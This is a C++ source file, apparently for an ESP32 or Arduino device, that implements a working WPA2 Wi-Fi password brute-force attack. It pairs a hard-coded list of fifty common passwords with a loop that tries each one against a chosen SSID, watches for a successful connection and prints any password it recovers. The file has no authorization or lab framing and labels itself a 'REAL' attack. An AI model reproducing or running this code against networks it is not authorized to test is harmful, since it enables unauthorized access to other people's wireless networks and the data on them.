#include "wifi_bruteforce.h"
#include <WiFi.h>
#include <vector>

namespace WiFiBruteforce {

std::vector<String> getCommonPasswordList() {
    return {
        "password", "123456", "12345678", "qwerty", "abc123",
        "monkey", "1234567", "letmein", "trustno1", "dragon",
        "baseball", "111111", "iloveyou", "master", "sunshine",
        "ashley", "bailey", "passw0rd", "shadow", "123123",
        "654321", "superman", "qazwsx", "michael", "football",
        "jesus", "ninja", "mustang", "password123", "welcome",
        "login", "admin", "admin123", "root", "toor",
        "pass", "pass123", "123", "000000", "999999",
        "admin@123", "adminpass", "password1", "1234", "12345",
        "123456789", "1q2w3e4r", "aaaaaa", "zxcvbnm", "asdfgh"
    };
}

BruteResult bruteForce(const String &targetSSID, uint16_t timeoutMs) {
    BruteResult result{false, "", 0, 0, targetSSID, ""};

    unsigned long startTime = millis();
    std::vector<String> wordlist = getCommonPasswordList();

    Serial.println("\n=== WiFi WPA2 Brute-Force (REAL) ===");
    Serial.println("Target SSID: " + targetSSID);
    Serial.println("Wordlist size: " + String(wordlist.size()));
    Serial.println("Timeout: " + String(timeoutMs) + "ms");
    Serial.println("Starting real WiFi connection attempts...\n");

    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true);
    delay(100);

    for (size_t i = 0; i < wordlist.size(); i++) {
        if (millis() - startTime > timeoutMs) {
            result.error = "Timeout reached";
            break;
        }

        result.attemptsCount++;
        const char* password = wordlist[i].c_str();

        Serial.printf("[%u/%u] Trying: %s\n",
                     result.attemptsCount, wordlist.size(), password);

        WiFi.begin(targetSSID.c_str(), password);

        uint32_t connStart = millis();
        wl_status_t status = WL_IDLE_STATUS;

        while ((millis() - connStart) < 5000 && status != WL_CONNECTED) {
            status = WiFi.status();

            if (status == WL_CONNECT_FAILED || status == WL_NO_SSID_AVAIL) {
                break;
            }

            delay(100);
        }

        if (WiFi.isConnected()) {
            result.passwordFound = true;
            result.foundPassword = wordlist[i];
            Serial.printf("\n✓ PASSWORD FOUND: %s\n", password);
            Serial.printf("RSSI: %d dBm\n", WiFi.RSSI());
            WiFi.disconnect(true);
            break;
        }

        WiFi.disconnect(true);
        delay(500);
    }

    result.durationMs = millis() - startTime;

    if (!result.passwordFound) {
        Serial.println("\n✗ Password not found in wordlist");
        result.error = "Password not in wordlist";
    }

    Serial.printf("Attempts: %u | Duration: %lums | Rate: %.1f attempts/sec\n",
                 result.attemptsCount, result.durationMs,
                 (result.attemptsCount * 1000.0f) / result.durationMs);

    return result;
}

} // namespace WiFiBruteforce
